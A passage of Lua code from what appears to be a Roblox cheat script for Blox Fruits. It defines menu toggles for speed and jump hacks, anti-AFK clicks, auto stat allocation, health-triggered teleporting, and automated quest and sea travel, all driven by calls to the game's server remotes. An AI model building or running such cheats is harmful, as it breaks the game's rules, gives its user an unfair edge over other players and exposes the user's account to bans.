        end,
    })

    v9:AddSection("Team")

    v9:AddButton({
        Name = "Join Pirate Team",
        Callback = function()
            Pirates()
        end,
    })

    v9:AddButton({
        Name = "Join Marine Team",
        Callback = function()
            Marines()
        end,
    })

    v9:AddSection("Race")

    v9:AddToggle({
        Name = "Auto Active Race V3",
        Default = GetSetting("RaceClickAutov3", false),
        Callback = function(raceClickAutov3)
            _G.RaceClickAutov3 = raceClickAutov3
            _G.SaveData.RaceClickAutov3 = raceClickAutov3
            SaveSettings()
        end,
    })

    spawn(function()
        while wait(0.2) do
            pcall(function()
                if _G.RaceClickAutov3 then
                    repeat
                        ReplicatedStorage.Remotes.CommE:FireServer("ActivateAbility")
                        wait(30)
                    until not _G.RaceClickAutov3
                end
            end)
        end
    end)

    v9:AddToggle({
        Name = "Auto Active Race V4",
        Default = GetSetting("RaceClickAutov4", false),
        Callback = function(raceClickAutov4)
            _G.RaceClickAutov4 = raceClickAutov4
            _G.SaveData.RaceClickAutov4 = raceClickAutov4
            SaveSettings()

            spawn(function()
                while _G.RaceClickAutov4 and task.wait(0.5) do
                    pcall(function()
                        local character3 = game.Players.LocalPlayer.Character

                        if character3 and character3:FindFirstChild("RaceEnergy") and character3.RaceEnergy.Value >= 1 then
                            local awakening = game.Players.LocalPlayer.Backpack:FindFirstChild("Awakening")
                            local awakening2 = awakening or character3:FindFirstChild("Awakening")

                            if awakening2 and awakening2:FindFirstChild("RemoteFunction") then
                                awakening2.RemoteFunction:InvokeServer(true)
                            end
                        end
                    end)
                end
            end)
        end,
    })

    v9:AddSection("Select Skill")

    v9:AddDropdown({
        Name = "Melee",
        Default = GetSetting("MeleeSkills", {}),
        Options = {"Z", "X", "C"},
        MultiSelect = true,
        Callback = function(meleeSkills)
            _G.MeleeZ = meleeSkills.Z
            _G.MeleeX = meleeSkills.X
            _G.MeleeC = meleeSkills.C
            _G.SaveData.MeleeSkills = meleeSkills
            SaveSettings()
        end,
    })

    v9:AddDropdown({
        Name = "Sword",
        Default = GetSetting("SwordSkills", {}),
        Options = {"Z", "X"},
        MultiSelect = true,
        Callback = function(swordSkills)
            _G.SwordZ = swordSkills.Z
            _G.SwordX = swordSkills.X
            _G.SaveData.SwordSkills = swordSkills
            SaveSettings()
        end,
    })

    v9:AddDropdown({
        Name = "Blox Fruit",
        Default = GetSetting("BloxFruitSkills", {}),
        Options = {"Z", "X", "C", "V", "F"},
        MultiSelect = true,
        Callback = function(bloxFruitSkills)
            _G.BloxFruitZ = bloxFruitSkills.Z
            _G.BloxFruitX = bloxFruitSkills.X
            _G.BloxFruitC = bloxFruitSkills.C
            _G.BloxFruitV = bloxFruitSkills.V
            _G.BloxFruitF = bloxFruitSkills.F
            _G.SaveData.BloxFruitSkills = bloxFruitSkills
            SaveSettings()
        end,
    })

    v9:AddDropdown({
        Name = "Gun",
        Default = GetSetting("GunSkills", {}),
        Options = {"Z", "X"},
        MultiSelect = true,
        Callback = function(gunSkills)
            _G.GunZ = gunSkills.Z
            _G.GunX = gunSkills.X
            _G.SaveData.GunSkills = gunSkills
            SaveSettings()
        end,
    })

    v9:AddSection("Menu")

    v9:AddButton({
        Name = "Awakenings Expert",
        Callback = function()
            localPlayer.PlayerGui.Main.AwakeningToggler.Visible = true
        end,
    })

    v9:AddButton({
        Name = "Devil Fruit Shop",
        Callback = function()
            require(localPlayer.PlayerGui.Main.UIController.FruitShop):Open("FruitDealer")
        end,
    })

    v9:AddButton({
        Name = "Advanced Fruit Dealer",
        Callback = function()
            require(localPlayer.PlayerGui.Main.UIController.FruitShop):Open("AdvancedFruitDealer")
        end,
    })

    v9:AddButton({
        Name = "Titles",
        Callback = function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("getTitles", true)
            localPlayer.PlayerGui.Main.Titles.Visible = true
        end,
    })

    v9:AddSection("Local-Player")
    getgenv().WalkSpeedValue = GetSetting("WalkSpeedValue", 30)
    getgenv().JumpValue = GetSetting("JumpValue", 50)
    _G.WalkSpeedEnabled = GetSetting("WalkSpeedEnabled", false)
    _G.JumpEnabled = GetSetting("JumpEnabled", false)
    _G.SmoothFarmEnabled = GetSetting("SmoothFarmEnabled", false)
    local tbl17 = {}
    local tbl18 = {}

    ApplyWalkSpeed = function(arg)
        if arg then
            arg.WalkSpeed = getgenv().WalkSpeedValue

            arg:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if _G.WalkSpeedEnabled and arg.WalkSpeed ~= getgenv().WalkSpeedValue then
                    arg.WalkSpeed = getgenv().WalkSpeedValue
                end
            end)
        end
    end

    ApplySmoothFarm = function(arg)
        local v30 = game
        local lighting = v30.Lighting
        local terrain = v30.Workspace.Terrain

        if arg then
            tbl17.WaterWaveSize = terrain.WaterWaveSize
            tbl17.WaterWaveSpeed = terrain.WaterWaveSpeed
            tbl17.WaterReflectance = terrain.WaterReflectance
            tbl17.WaterTransparency = terrain.WaterTransparency
            tbl17.GlobalShadows = lighting.GlobalShadows
            tbl17.FogEnd = lighting.FogEnd
            tbl17.Brightness = lighting.Brightness
            tbl17.QualityLevel = settings().Rendering.QualityLevel
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            terrain.WaterTransparency = 0
            lighting.GlobalShadows = false
            lighting.FogEnd = 9000000000
            lighting.Brightness = 0
            settings().Rendering.QualityLevel = "Level01"

            for k, descendant in pairs(v30:GetDescendants()) do
                if not descendant:IsA("Part") and not descendant:IsA("Union") and not descendant:IsA("CornerWedgePart") and not descendant:IsA("TrussPart") then
                    if not descendant:IsA("Decal") and not descendant:IsA("Texture") then
                        if not descendant:IsA("ParticleEmitter") and not descendant:IsA("Trail") then
                            if descendant:IsA("Explosion") then
                                if not tbl18[descendant] then
                                    tbl18[descendant] = {
                                        BlastPressure = descendant.BlastPressure,
                                        BlastRadius = descendant.BlastRadius,
                                    }
                                end

                                descendant.BlastPressure = 1
                                descendant.BlastRadius = 1
                            elseif not descendant:IsA("Fire") and not descendant:IsA("SpotLight") and not descendant:IsA("Smoke") and not descendant:IsA("Sparkles") then
                                if descendant:IsA("MeshPart") then
                                    if not tbl18[descendant] then
                                        tbl18[descendant] = {
                                            Material = descendant.Material,
                                            Reflectance = descendant.Reflectance,
                                            TextureID = descendant.TextureID,
                                        }
                                    end

                                    descendant.Material = "Plastic"
                                    descendant.Reflectance = 0
                                    descendant.TextureID = 1.0385902758728956e+16
                                end
                            else
                                if not tbl18[descendant] then
                                    tbl18[descendant] = {Enabled = descendant.Enabled}
                                end

                                descendant.Enabled = false
                            end
                        else
                            if not tbl18[descendant] then
                                tbl18[descendant] = {Lifetime = descendant.Lifetime}
                            end

                            descendant.Lifetime = NumberRange.new(0)
                        end
                    else
                        if not tbl18[descendant] then
                            tbl18[descendant] = {Transparency = descendant.Transparency}
                        end

                        descendant.Transparency = 1
                    end
                else
                    if not tbl18[descendant] then
                        tbl18[descendant] = {Material = descendant.Material, Reflectance = descendant.Reflectance}
                    end

                    descendant.Material = "Plastic"
                    descendant.Reflectance = 0
                end
            end

            for k, child in pairs(lighting:GetChildren()) do
                if child:IsA("BlurEffect") or child:IsA("SunRaysEffect") or child:IsA("ColorCorrectionEffect") or child:IsA("BloomEffect") or child:IsA("DepthOfFieldEffect") then
                    if not tbl18[child] then
                        tbl18[child] = {Enabled = child.Enabled}
                    end

                    child.Enabled = false
                end
            end
        else
            if tbl17.WaterWaveSize then
                terrain.WaterWaveSize = tbl17.WaterWaveSize
            end

            if tbl17.WaterWaveSpeed then
                terrain.WaterWaveSpeed = tbl17.WaterWaveSpeed
            end

            if tbl17.WaterReflectance then
                terrain.WaterReflectance = tbl17.WaterReflectance
            end

            if tbl17.WaterTransparency then
                terrain.WaterTransparency = tbl17.WaterTransparency
            end

            if tbl17.GlobalShadows ~= nil then
                lighting.GlobalShadows = tbl17.GlobalShadows
            end

            if tbl17.FogEnd then
                lighting.FogEnd = tbl17.FogEnd
            end

            if tbl17.Brightness then
                lighting.Brightness = tbl17.Brightness
            end

            if tbl17.QualityLevel then
                settings().Rendering.QualityLevel = tbl17.QualityLevel
            end

            local v31, v32, v33 = pairs(tbl18)
            local v34 = v33
            local v35 = v31
            local v36 = v32

            while true do
                local v37, v38 = v35(v36, v34)
                if v37 == nil then
                    break
                end
                v34 = v37

                if v37 and v37.Parent then
                    for k, v39 in pairs(v38) do
                        pcall(function()
                            v37[k] = v39
                        end)
                    end

                    v34 = v37
                end
            end

            tbl18 = {}
        end
    end

    v9:AddToggle({
        Name = "Walk Speed",
        Default = _G.WalkSpeedEnabled,
        Callback = function(walkSpeedEnabled)
            _G.WalkSpeedEnabled = walkSpeedEnabled
            _G.SaveData.WalkSpeedEnabled = walkSpeedEnabled
            SaveSettings()
            local character3 = localPlayer.Character
            local humanoid = character3 and localPlayer.Character:FindFirstChild("Humanoid")

            if walkSpeedEnabled and humanoid then
                ApplyWalkSpeed(humanoid)
            end
        end,
    })

    v9:AddSlider({
        Name = "Speed Hack",
        Min = 50,
        Max = 300,
        Default = getgenv().WalkSpeedValue,
        Callback = function(walkSpeedValue)
            getgenv().WalkSpeedValue = walkSpeedValue
            _G.SaveData.WalkSpeedValue = walkSpeedValue
            SaveSettings()
            local character3 = localPlayer.Character
            local humanoid = character3 and localPlayer.Character:FindFirstChild("Humanoid")

            if _G.WalkSpeedEnabled and humanoid then
                humanoid.WalkSpeed = walkSpeedValue
            end
        end,
    })

    localPlayer.CharacterAdded:Connect(function(character3)
        local humanoid = character3:WaitForChild("Humanoid", 5)

        if _G.WalkSpeedEnabled then
            ApplyWalkSpeed(humanoid)
        end

        if _G.JumpEnabled then
            humanoid.JumpPower = getgenv().JumpValue
        end
    end)

    if localPlayer.Character then
        local humanoid = localPlayer.Character:FindFirstChild("Humanoid")

        if _G.WalkSpeedEnabled then
            ApplyWalkSpeed(humanoid)
        end

        if _G.JumpEnabled and humanoid then
            humanoid.JumpPower = getgenv().JumpValue
        end
    end

    v9:AddToggle({
        Name = "High Jump",
        Default = _G.JumpEnabled,
        Callback = function(jumpEnabled)
            _G.JumpEnabled = jumpEnabled
            _G.SaveData.JumpEnabled = jumpEnabled
            SaveSettings()

            if jumpEnabled and localPlayer.Character then
                local humanoid = localPlayer.Character:FindFirstChild("Humanoid")

                if humanoid then
                    humanoid.JumpPower = getgenv().JumpValue
                end
            end
        end,
    })

    v9:AddSlider({
        Name = "Jump Hack",
        Min = 50,
        Max = 500,
        Default = getgenv().JumpValue,
        Callback = function(jumpValue)
            getgenv().JumpValue = jumpValue
            _G.SaveData.JumpValue = jumpValue
            SaveSettings()

            if _G.JumpEnabled and localPlayer.Character then
                local humanoid = localPlayer.Character:FindFirstChild("Humanoid")

                if humanoid then
                    humanoid.JumpPower = jumpValue
                end
            end
        end,
    })

    v9:AddSection("More FPS")
    local v30 = _G
    local fastModeEnabled = _G.FastModeEnabled
    local fastModeEnabled2 = fastModeEnabled or false
    v30.FastModeEnabled = fastModeEnabled2
    _G.SaveData.FastModeEnabled = _G.FastModeEnabled
    local tbl19 = {}

    ApplyFastMode = function(arg)
        for i, descendant in ipairs(workspace:GetDescendants()) do
            if descendant:IsA("Part") or descendant:IsA("MeshPart") or descendant:IsA("UnionOperation") then
                if arg then
                    if not tbl19[descendant] then
                        tbl19[descendant] = descendant.Material
                    end

                    descendant.Material = Enum.Material.Plastic
                elseif tbl19[descendant] then
                    descendant.Material = tbl19[descendant]
                end
            end
        end

        if not arg then
            table.clear(tbl19)
        end
    end

    v9:AddToggle({
        Name = "Fast Mode",
        Default = _G.FastModeEnabled,
        Callback = function(fastModeEnabled3)
            _G.FastModeEnabled = fastModeEnabled3
            _G.SaveData.FastModeEnabled = fastModeEnabled3
            SaveSettings()
            ApplyFastMode(fastModeEnabled3)
        end,
    })

    if _G.FastModeEnabled then
        ApplyFastMode(true)
    end

    v9:AddToggle({
        Name = "Smooth Farm Mode",
        Default = _G.SmoothFarmEnabled,
        Callback = function(smoothFarmEnabled)
            _G.SmoothFarmEnabled = smoothFarmEnabled
            _G.SaveData.SmoothFarmEnabled = smoothFarmEnabled
            SaveSettings()
            ApplySmoothFarm(smoothFarmEnabled)
        end,
    })

    if _G.SmoothFarmEnabled then
        ApplySmoothFarm(true)
    end

    v9:AddSection("Others")

    v9:AddToggle({
        Name = "Walk on Water",
        Default = GetSetting("WalkWater_Part", true),
        Callback = function(walkWaterPart)
            _G.WalkWater_Part = walkWaterPart
            _G.SaveData.WalkWater_Part = walkWaterPart
            SaveSettings()

            if _G.WalkWater_Part then
                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 112, 1000)
            else
                game:GetService("Workspace").Map["WaterBase-Plane"].Size = Vector3.new(1000, 80, 1000)
            end
        end,
    })

    v9:AddToggle({
        Name = "Anti AFK",
        Default = GetSetting("AntiAFK", true),
        Callback = function(antiAFK)
            _G.AntiAFK = antiAFK
            _G.SaveData.AntiAFK = antiAFK
            SaveSettings()
        end,
    })

    localPlayer.Idled:connect(function()
        vim2:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        wait(1)
        vim2:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)

    v9:AddToggle({
        Name = "Auto Set Spawn Point",
        Default = GetSetting("AutoSetSpawnPoint", false),
        Callback = function(autoSetSpawnPoint)
            AutoSetSpawnPoint = autoSetSpawnPoint
            _G.SaveData.AutoSetSpawnPoint = autoSetSpawnPoint
            SaveSettings()
        end,
    })

    spawn(function()
        while wait(Sec) do
            pcall(function()
                if AutoSetSpawnPoint then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                end
            end)
        end
    end)

    v9:AddToggle({
        Name = "Safe Mode",
        Default = GetSetting("Safemode", true),
        Callback = function(safemode)
            _G.Safemode = safemode
            _G.SaveData.Safemode = safemode
            SaveSettings()
        end,
    })

    spawn(function()
        while task.wait(0.1) do
            if _G.Safemode then
                pcall(function()
                    local character3 = localPlayer.Character
                    if not character3 then
                        return
                    end
                    local humanoid = character3:FindFirstChild("Humanoid")
                    local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")

                    if humanoid and humanoidRootPart2 then
                        local n3 = humanoid.Health / humanoid.MaxHealth

                        if n3 <= 0.5 then
                            if not IsUp then
                                SafePos = humanoidRootPart2.CFrame
                                local n4 = humanoidRootPart2.CFrame * CFrame.new(0, 500, 0)
                                UpPos = n4
                                IsUp = true
                            end

                            if UpPos then
                                humanoidRootPart2.CFrame = UpPos
                            end
                        elseif n3 >= 0.65 and IsUp and SafePos then
                            humanoidRootPart2.CFrame = SafePos
                            IsUp = false
                            SafePos = nil
                            UpPos = nil
                        end
                    end
                end)
            end
        end
    end)

    v9:AddToggle({
        Name = "Remove Damage",
        Default = GetSetting("RemoveDamage", true),
        Callback = function(removeDamage)
            _G.RemoveDamage = removeDamage
            _G.SaveData.RemoveDamage = removeDamage
            local damageCounter = game:GetService("ReplicatedStorage").Assets.GUI.DamageCounter
            local enabled

            if removeDamage then
                enabled = false
            else
                enabled = true
            end

            damageCounter.Enabled = enabled
            SaveSettings()
        end,
    })

    v9:AddToggle({
        Name = "Remove Notifications",
        Default = GetSetting("RemoveNotifications", false),
        Callback = function(removeNotifications)
            _G.RemoveNotifications = removeNotifications
            _G.SaveData.RemoveNotifications = removeNotifications
            local notifications = Player.PlayerGui.Notifications
            local enabled

            if removeNotifications then
                enabled = false
            else
                enabled = true
            end

            notifications.Enabled = enabled
            SaveSettings()
        end,
    })

    StatsDelay = 0.5
    local pSats = GetSetting("pSats", 2)

    v22:AddSlider({
        Name = "Points Amount",
        Min = 1,
        Max = 2000,
        Default = pSats,
        Increase = 1,
        Callback = function(pSats2)
            pSats = pSats2
            _G.SaveData.pSats = pSats2
            SaveSettings()
        end,
    })

    v22:AddToggle({
        Name = "Auto Stats",
        Default = GetSetting("Auto_Stats_Master", false),
        Callback = function(autoStatsMaster)
            _G.Auto_Stats_Master = autoStatsMaster
            _G.SaveData.Auto_Stats_Master = autoStatsMaster
            SaveSettings()
        end,
    })

    v22:AddSection("Select Stats")

    v22:AddToggle({
        Name = "Melee",
        Default = GetSetting("Auto_Melee", false),
        Callback = function(autoMelee)
            _G.Auto_Melee = autoMelee
            _G.SaveData.Auto_Melee = autoMelee
            SaveSettings()
        end,
    })

    spawn(function()
        while task.wait(StatsDelay) do
            pcall(function()
                if _G.Auto_Stats_Master and _G.Auto_Melee then
                    statsSetings("Melee", pSats)
                end
            end)
        end
    end)

    v22:AddToggle({
        Name = "Defense",
        Default = GetSetting("Auto_Defense", false),
        Callback = function(autoDefense)
            _G.Auto_Defense = autoDefense
            _G.SaveData.Auto_Defense = autoDefense
            SaveSettings()
        end,
    })

    spawn(function()
        while task.wait(StatsDelay) do
            pcall(function()
                if _G.Auto_Stats_Master and _G.Auto_Defense then
                    statsSetings("Defense", pSats)
                end
            end)
        end
    end)

    v22:AddToggle({
        Name = "Gun",
        Default = GetSetting("Auto_Gun", false),
        Callback = function(autoGun)
            _G.Auto_Gun = autoGun
            _G.SaveData.Auto_Gun = autoGun
            SaveSettings()
        end,
    })

    spawn(function()
        while task.wait(StatsDelay) do
            pcall(function()
                if _G.Auto_Stats_Master and _G.Auto_Gun then
                    statsSetings("Gun", pSats)
                end
            end)
        end
    end)

    v22:AddToggle({
        Name = "Sword",
        Default = GetSetting("Auto_Sword", false),
        Callback = function(autoSword)
            _G.Auto_Sword = autoSword
            _G.SaveData.Auto_Sword = autoSword
            SaveSettings()
        end,
    })

    spawn(function()
        while task.wait(StatsDelay) do
            pcall(function()
                if _G.Auto_Stats_Master and _G.Auto_Sword then
                    statsSetings("Sword", pSats)
                end
            end)
        end
    end)

    v22:AddToggle({
        Name = "Demon Fruit",
        Default = GetSetting("Auto_DevilFruit", false),
        Callback = function(autoDevilFruit)
            _G.Auto_DevilFruit = autoDevilFruit
            _G.SaveData.Auto_DevilFruit = autoDevilFruit
            SaveSettings()
        end,
    })

    spawn(function()
        while task.wait(StatsDelay) do
            pcall(function()
                if _G.Auto_Stats_Master and _G.Auto_DevilFruit then
                    statsSetings("Devil", pSats)
                end
            end)
        end
    end)

    if World1 or World2 then
        v4:AddSection("Next World")
    end

    if World1 then
        v4:AddToggle({
            Name = "Auto Second Sea",
            Default = GetSetting("TravelDres", false),
            Callback = function(travelDres)
                _G.TravelDres = travelDres
                _G.SaveData.TravelDres = travelDres
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.TravelDres and localPlayer.Data.Level.Value >= 700 then
                        if workspace.Map.Ice.Door.CanCollide == true and workspace.Map.Ice.Door.Transparency == 0 then
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Detective")
                            EquipWeapon("Key")

                            repeat
                                wait()
                                tween(CFrame.new(1347.7124, 37.3751602, -1325.6488))
                            until not _G.TravelDres or humanoidRootPart.Position == CFrame.new(1347.7124, 37.3751602, -1325.6488).Position
                        elseif workspace.Map.Ice.Door.CanCollide == false and workspace.Map.Ice.Door.Transparency == 1 then
                            if Enemies:FindFirstChild("Ice Admiral") then
                                for k, child in pairs(Enemies:GetChildren()) do
                                    if child.Name == "Ice Admiral" and index.Alive(child) then
                                        repeat
                                            task.wait()
                                            Kill(child, _G.TravelDres)
                                        until _G.TravelDres == false or child.Humanoid.Health <= 0

                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
                                    end
                                end
                            else
                                tween(CFrame.new(1347.7124, 37.3751602, -1325.6488))
                            end
                        else
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelDressrosa")
                        end
                    end
                end)
            end
        end)
    end

    if World2 then
        v4:AddToggle({
            Name = "Auto Third Sea",
            Default = GetSetting("AutoZou", false),
            Callback = function(autoZou)
                _G.AutoZou = autoZou
                _G.SaveData.AutoZou = autoZou
                SaveSettings()
            end,
        })

        spawn(function()
            while wait(Sec) do
                pcall(function()
                    if _G.AutoZou and localPlayer.Data.Level.Value >= 1500 then
                        if ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 3 then
                            if ReplicatedStorage.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                                if ReplicatedStorage.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                                    TabelDevilFruitStore = {}
                                    TabelDevilFruitOpen = {}
                                    local v31, v32, v33 = pairs(ReplicatedStorage.Remotes.CommF_:InvokeServer("getInventoryFruits"))
                                    local v34 = v33
                                    local v35 = v31
                                    local v36 = v32

                                    while true do
                                        local v37, v38 = v35(v36, v34)
                                        if v37 == nil then
                                            break
                                        end

                                        for k, v39 in pairs(v38) do
                                            if k == "Name" then
                                                table.insert(TabelDevilFruitStore, v39)
                                            end
                                        end

                                        v34 = v37
                                    end

                                    local v37 = next
                                    local response, v38 = game.ReplicatedStorage:WaitForChild("Remotes").CommF_:InvokeServer("GetFruits")

                                    for k, v39 in v37, response, v38 do
                                        if v39.Price >= 1000000 then
                                            table.insert(TabelDevilFruitOpen, v39.Name)
                                        end
                                    end

                                    local v39, v40, v41 = pairs(TabelDevilFruitOpen)
                                    local v42 = v41
                                    local v43 = v39
                                    local v44 = v40

                                    while true do
                                        local v45, v46 = v43(v44, v42)
                                        if v45 == nil then
                                            break
                                        end

                                        for k, v47 in pairs(TabelDevilFruitStore) do
                                            if v46 == v47 and ReplicatedStorage.Remotes.CommF_:InvokeServer("GetUnlockables").FlamingoAccess == nil then
                                                if localPlayer.Backpack:FindFirstChild(v47) then
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "1")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "2")
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "3")
                                                else
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "LoadFruit", v47)
                                                end
                                            end
                                        end

                                        v42 = v45
                                    end

                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "1")
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "2")
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TalkTrevor", "3")
                                end
                            else
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TravelZou")

                                if ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Check") == 0 then
                                    local ripIndra = MobCheck("rip_indra")

                                    if ripIndra then
                                        repeat
                                            wait()
                                            Kill(ripIndra, _G.AutoZou)
                                        until not _G.AutoZou or not ripIndra.Parent or ripIndra.Humanoid.Health <= 0

                                        Check = 2

                                        repeat
                                            wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TravelZou")
                                        until Check == 1
                                    else
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "ZQuestProgress", "Check")
                                        wait(0.1)
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "ZQuestProgress", "Begin")
                                    end
                                elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Check") == 1 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("F_", "TravelZou")
                                else
                                    local v31 = MobCheck("Don Swan")

                                    if v31 then
                                        repeat
                                            wait()
                                            Kill(v31, _G.AutoZou)
                                        until not _G.AutoZou or not v31.Parent or v31.Humanoid.Health <= 0
                                    else
                                        repeat
                                            wait()
                                            tween(CFrame.new(2288.802, 15.1870775, 863.034607))
                                        until not _G.AutoZou or humanoidRootPart.Position == CFrame.new(2288.802, 15.1870775, 863.034607).Position

                                        if humanoidRootPart.CFrame == CFrame.new(2288.802, 15.1870775, 863.034607) then
                                            fn(CFrame.new(2288.802, 15.1870775, 863.034607))
                                        end
                                    end
                                end
                            end
                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 0 then
                            if string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "Swan Pirates") and string.find(localPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, "50") and localPlayer.PlayerGui.Main.Quest.Visible == true then
                                local v31 = MobCheck("Swan Pirate")

                                if v31 then
                                    pcall(function()
                                        repeat
                                            wait()
                                            Kill(v31, _G.AutoZou)
                                        until not v31.Parent or v31.Humanoid.Health <= 0 or _G.AutoZou == false or localPlayer.PlayerGui.Main.Quest.Visible == false
                                    end)
                                else
                                    tween(CFrame.new(1057.92761, 137.614319, 1242.08069))
                                end
                            else
                                tween(CFrame.new(-456.28952, 73.0200958, 299.895966))
                            end
                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 1 then
                            local Jeremy = MobCheck("Jeremy")

                            if Jeremy then
                                repeat
                                    wait()
                                    Kill(Jeremy, _G.AutoZou)
                                until not Jeremy.Parent or Jeremy.Humanoid.Health <= 0 or _G.AutoZou == false
                            else
                                tween(CFrame.new(2099.88159, 448.931, 648.997375))
                            end
                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 2 then
                            repeat
                                wait()
                                tween(CFrame.new(-1836, 11, 1714))
                            until not _G.AutoZou or humanoidRootPart.Position == CFrame.new(-1836, 11, 1714).Position

                            if humanoidRootPart.CFrame == CFrame.new(-1836, 11, 1714) then
                                fn(CFrame.new(-1836, 11, 1714))
                            end

                            fn(CFrame.new(-1850.49329, 13.1789551, 1750.89685))
                            wait(0.1)
                            fn(CFrame.new(-1858.87305, 19.3777466, 1712.01807))
                            wait(0.1)
                            fn(CFrame.new(-1803.94324, 16.5789185, 1750.89685))
                            wait(0.1)
                            fn(CFrame.new(-1858.55835, 16.8604317, 1724.79541))
                            wait(0.1)
                            fn(CFrame.new(-1869.54224, 15.987854, 1681.00659))
                            wait(0.1)
                            fn(CFrame.new(-1800.0979, 16.4978027, 1684.52368))
                            wait(0.1)
                            fn(CFrame.new(-1819.26343, 14.795166, 1717.90625))
                            wait(0.1)
                            fn(CFrame.new(-1813.51843, 14.8604736, 1724.79541))
                        end
                    end
                end)
            end
        end)
    end

    if World3 then
        v4:AddSection("Dojo")

        v4:AddToggle({
            Name = "Auto Dojo Trainer",
            Default = false,
            Callback = function(dojoo)
                _G.Dojoo = dojoo
            end,
        })

        printBeltName = function(arg)
            if type(arg) == "table" and arg.Quest.BeltName then
                return arg.Quest.BeltName
            end
        end

        spawn(function()
            while wait(1) do
                if _G.Dojoo then
                    pcall(function()
                        local response = ReplicatedStorage.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({{NPC = "Dojo Trainer", Command = "RequestQuest"}}))
                        local v31 = printBeltName(response)

                        if debug == false and not response and not v31 then
                            tween(CFrame.new(5865.0234375, 1208.3154296875, 871.15185546875))
                            debug = true
                        elseif debug == true and (CFrame.new(5865.0234375, 1208.3154296875, 871.15185546875).Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude <= 50 then
                            if v31 == "White" then
                                local v32 = MobCheck("Skull Slayer")

                                if v32 then
                                    repeat
                                        task.wait()
                                        Kill(v32, _G.Dojoo)
                                    until not response or not _G.Dojoo or not index.Alive(v32)
                                else
                                    tween(CFrame.new(-16759.58984375, 71.28376770019531, 1595.3399658203125))
                                end
                            elseif v31 == "Yellow" then
                                repeat
                                    task.wait()
                                    _G.seabeatfarm = true
                                    _G.TerrorShark = true
                                    _G.Shark = true
                                    _G.Piranha = true
                                    _G.MobCrew = true
                                    _G.FishBoat = true
                                    _G.SailBoats = true
                                until not _G.Dojoo or not response

                                _G.seabeatfarm = false
                                _G.TerrorShark = false
                                _G.Shark = false
                                _G.Piranha = false
                                _G.MobCrew = false
                                _G.FishBoat = false
                                _G.SailBoats = false
                            elseif v31 == "Green" then
                                repeat
                                    task.wait()
                                    _G.SailBoats = true
                                until not _G.Dojoo or not response

                                _G.SailBoats = false
                            elseif v31 == "Purple" then
                                repeat
                                    task.wait()
                                    _G.farmelite = true
                                until not _G.Dojoo or not response

                                _G.farmelite = false
                            elseif v31 == "Red" then
                                repeat
                                    task.wait()
                                    _G.SailBoats = true
                                    _G.FishBoat = true
                                until not _G.Dojoo or not response

                                _G.SailBoats = false
                                _G.FishBoat = false
                            elseif v31 == "Black" then
                                repeat
                                    task.wait()

                                    if not workspace.Map:FindFirstChild("PrehistoricIsland") and not workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") then
                                        _G.Prehis_Find = true
                                        _G.Prehis_Skills = false
                                    else
                                        _G.Prehis_Find = true

                                        if workspace.Map.PrehistoricIsland.Core.ActivationPrompt:FindFirstChild("ProximityPrompt", true) then
                                            _G.Prehis_Skills = false
                                            _G.Prehis_Find = true
                                        else
                                            _G.Prehis_Skills = true
                                            _G.Prehis_Find = false
                                        end
                                    end
                                until not _G.Dojoo or not response

                                _G.Prehis_Find = false
                                _G.Prehis_Skills = false
                            elseif v31 == "Orange" or v31 == "Blue" then
                                return nil
                            end
                        end

                        if not response then
                            debug = false
                            ReplicatedStorage.Modules.Net:FindFirstChild("RF/InteractDragonQuest"):InvokeServer(unpack({{NPC = "Dojo Trainer", Command = "ClaimQuest"}}))
                        end
                    end)
                end
            end
        end)

        v4:AddToggle({
            Name = "Auto Dragon Hunter",
            Default = false,
            Callback = function(farmBlazeEM)
                _G.FarmBlazeEM = farmBlazeEM
            end,
        })

        checkQuesta = function()
            local tbl20 = {{Context = "Check"}}
            local response = nil

            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net"):WaitForChild("RF/DragonHunter"):InvokeServer(unpack({{Context = "RequestQuest"}}))
            end)

